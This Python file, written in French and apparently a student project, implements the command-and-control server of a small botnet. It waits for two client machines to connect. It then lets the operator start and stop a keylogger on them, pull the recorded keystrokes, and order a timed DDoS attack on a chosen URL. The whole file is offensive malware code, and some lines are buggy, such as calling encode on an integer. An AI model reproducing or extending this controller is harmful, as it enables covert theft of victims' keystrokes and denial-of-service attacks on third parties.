import socket
import time
import argparse


class MasterProject:
    def __init__(self,connexion_principale):
        self.connexion_principale = socket
        self.liste_client = liste_client =[]

    def run(self, connexion_principale, liste_client):


        self.parametres()
        connexion_principale = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connexion_principale.bind((host, port_serveur))
        print("Le serveur est demarré sur le port {}".format(port_serveur))


        connexion_principale.listen(5)


        print("Le serveur écoute à présent sur le port {}".format(port_serveur))


        compteur_client = 0
        while compteur_client < 2:
            connexion_avec_client, infos_connexion = connexion_principale.accept()
            ip, port_client = str(infos_connexion[0]), str(infos_connexion[1]) 
            liste_client.append(connexion_avec_client)
            print ("Connecter avec " + ip + ":" + port_client)

            compteur_client += 1
            print ("Nombre de machine connecté : ", len(liste_client))

        print("->Pour demarrer le Keylogger ecrivez : start_log")
        print("->Pour stopper le Keylogger ecrivez : stop_log")
        print("->Pour recuperer les dernieres lignes enregistrée du Keylogger ecrivez : get_log")
        print("->Pour faire une attaque ddos ecrivez : ddos")
        print("->Pour finir la connexion avec les clients ecrivez : fin_connexion")
        print("->Pour fermer le serveur ecrivez : fin_serveur")
        question = input("Que souhaitez-vous faire ?? : ")   
        indice = 0

        while question != "fin_serveur": 
                
            if question == "start_log" : 
                self.start_log(liste_client)
                indice +=1
                question = input("Que souhaitez-vous faire ?? : ")

            elif question == "stop_log":
                if indice == 1:
                    self.stop_log(liste_client)
                    question = input("Que souhaitez-vous faire ?? : ")
                else :
                    print("Le keylloger n'est pas allumé, vous ne pouvez pas l'éteindre")
                    question = input("Que souhaitez-vous faire ?? : ")
                
            elif question == "get_log":
                self.get_log(liste_client)
                question = input("Que souhaitez-vous faire ?? : ")
                    
            elif question == "ddos":
                self.ddos(liste_client)
                question = input("Que souhaitez-vous faire ?? : ")

            elif question == "fin_connexion":
                self.fin_client(liste_client)
                question = input("Que souhaitez-vous faire ?? : ")

            elif question == "fin_serveur":
                print("Le serveur est fermé !")       
                connexion_principale.close()
            else:
                print("Erreur : je ne connais pas cette ordre")
                question = input("Que souhaitez-vous faire ?? : ")




    def start_log(self, liste_client):
        i = 0
        while i < len(liste_client) :
            ordre = "start_Keylogger"
            liste_client[i].send(ordre.encode("utf-8"))
            retour = liste_client[i].recv(1024).decode("utf-8")
            print (retour)
            i += 1
        
       
    def stop_log(self, liste_client):
        i = 0
        while i < len(liste_client):
            ordre = "stop_Keylogger"
            liste_client[i].send(ordre.encode("utf-8"))
            retour = liste_client[i].recv(1024).decode("utf-8")
            print (retour)
            i += 1

    def get_log(self, liste_client):
        i = 0
        k = 0
        j = 0
        
        while i < len(liste_client):
            ordre = "get_log"
            liste_client[i].send(ordre.encode("utf-8"))
            i += 1 

        nb_lignes = input("Entrez le nombre de ligne que vous souhaitez recuperer")

        while k < len(liste_client):
            liste_client[k].send(nb_lignes.encode("utf-8"))
            k += 1

        while j < len(liste_client):
            lignes_retournees = liste_client[j].recv(1024).decode("utf-8")
            print (lignes_retournees, "\n")
            j += 1

    def ddos(self, liste_client):
        i = 0
        j = 0
        k = 0
        l = 0

        while i < len(liste_client):
            ordre = "start_ddos"
            liste_client[i].send(ordre.encode("utf-8"))
            i += 1

        ip_ddos = str(input("Sur quelle url souhaitez-vous envoyez la requete"))

        while k < len(liste_client):
            liste_client[k].send(ip_ddos.encode("utf-8"))
            k += 1

        temps_en_senconde = int(input("Apres combien de temps souhaitez vous lancez l'attaque? (en seconde)"))

        while l < len(liste_client):
            liste_client[l].send(temps_en_senconde.encode("utf-8"))
            l += 1

        while j < 2:    
            retour = liste_client[j].recv(1024).decode("utf-8")
            print (retour)
            j += 1 


    def fin_client(self, liste_client):
        i = 0
        while i < len(liste_client):
            ordre = "fin_connexion"
            liste_client[i].send(ordre.encode("utf-8"))
            retour = liste_client[i].recv(1024).decode("utf-8")
            print (retour)
            i += 1

    def parametres(self):

        global port_serveur
        global host
       
        parametre = argparse.ArgumentParser()
        parametre.add_argument("-p","--port",type=int,dest="port",help="port du serveur")
        parametre.add_argument("-i","--ip",dest="host",help="ip de l'hote du serveur")
        args = parametre.parse_args()

        if args.port != 0 :
            port_serveur = args.port
        if args.host != 0 :
            host = args.host

            
           
         
            
      
master = MasterProject(socket)
master.run(socket, [])



